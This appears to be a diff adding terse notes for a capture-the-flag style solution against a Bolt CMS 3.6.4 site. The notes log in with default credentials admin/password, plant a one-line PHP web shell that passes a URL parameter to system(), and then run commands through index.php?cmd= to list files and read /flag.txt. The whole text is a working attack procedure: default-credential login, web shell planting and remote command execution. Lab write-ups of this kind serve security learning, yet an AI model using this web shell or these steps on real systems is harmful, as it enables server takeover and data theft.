@@ -1,0 +1,9 @@
+go on site 
+add (link+bolt)
+username: admin
+password: password
+It Is bolt 3.6.4
+write php command - <?php echo system($_GET['cmd'])?>
+next in link index.php?cmd=(ls -l)
+index.php?cmd=(cat /flag.txt)
+
